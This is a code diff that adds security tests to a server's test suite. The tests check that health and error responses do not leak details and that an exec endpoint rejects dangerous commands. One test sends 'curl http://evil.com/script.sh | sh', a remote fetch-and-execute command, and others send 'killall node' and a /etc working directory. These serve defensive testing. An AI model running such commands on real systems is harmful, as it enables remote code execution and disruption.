@@ -50,6 +50,13 @@ describe("Health", () => {
     expect(data.status).toBe("ok");
     expect(data.services).toBeDefined();
   });
+
+  it("does not leak system info", async () => {
+    const res = await fetch(`${baseUrl}/health`);
+    const data = await res.json();
+    expect(data.system).toBeUndefined();
+    expect(data.services?.whatsapp).not.toContain("/");
+  });
 });
 
 describe("Auth", () => {
@@ -121,6 +128,43 @@ describe("Exec", () => {
     expect(res.status).toBe(403);
   });
 
+  it("blocks curl pipe to shell", async () => {
+    const res = await fetch(`${baseUrl}/exec`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json", ...authed() },
+      body: JSON.stringify({ command: "curl http://evil.com/script.sh | sh" }),
+    });
+    expect(res.status).toBe(403);
+  });
+
+  it("blocks killall", async () => {
+    const res = await fetch(`${baseUrl}/exec`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json", ...authed() },
+      body: JSON.stringify({ command: "killall node" }),
+    });
+    expect(res.status).toBe(403);
+  });
+
+  it("blocks cwd outside allowed paths", async () => {
+    const res = await fetch(`${baseUrl}/exec`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json", ...authed() },
+      body: JSON.stringify({ command: "ls", cwd: "/etc" }),
+    });
+    expect(res.status).toBe(403);
+  });
+
+  it("does not leak error message field", async () => {
+    const res = await fetch(`${baseUrl}/exec`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json", ...authed() },
+      body: JSON.stringify({ command: "false" }),
+    });
+    const data = await res.json();
+    expect(data.error).toBeUndefined();
+  });
+
   it("rejects missing command", async () => {
     const res = await fetch(`${baseUrl}/exec`, {
       method: "POST",
@@ -151,13 +195,37 @@ describe("DataForSEO", () => {
     expect(res.status).toBe(400);
   });
 
-  it("accepts valid endpoint structure", async () => {
+  it("rejects endpoint not starting with /v3/", async () => {
+    const res = await fetch(`${baseUrl}/dataforseo`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json", ...authed() },
+      body: JSON.stringify({ endpoint: "/admin/something" }),
+    });
+    expect(res.status).toBe(400);
+    const data = await res.json();
+    expect(data.error).toContain("/v3/");
+  });
+
+  it("returns 503 when auth not configured", async () => {
+    // In test env, DATAFORSEO_AUTH is not set so config.dataforseoAuth is ""
     const res = await fetch(`${baseUrl}/dataforseo`, {
       method: "POST",
       headers: { "Content-Type": "application/json", ...authed() },
       body: JSON.stringify({ endpoint: "/v3/serp/google/organic/live/advanced", body: [{ keyword: "test", location_code: 2840 }] }),
     });
-    expect([200, 502]).toContain(res.status);
+    expect(res.status).toBe(503);
+  });
+
+  it("error response does not leak details", async () => {
+    const res = await fetch(`${baseUrl}/dataforseo`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json", ...authed() },
+      body: JSON.stringify({ endpoint: "/v3/test" }),
+    });
+    if (res.status === 502) {
+      const data = await res.json();
+      expect(data.detail).toBeUndefined();
+    }
   });
 });
 
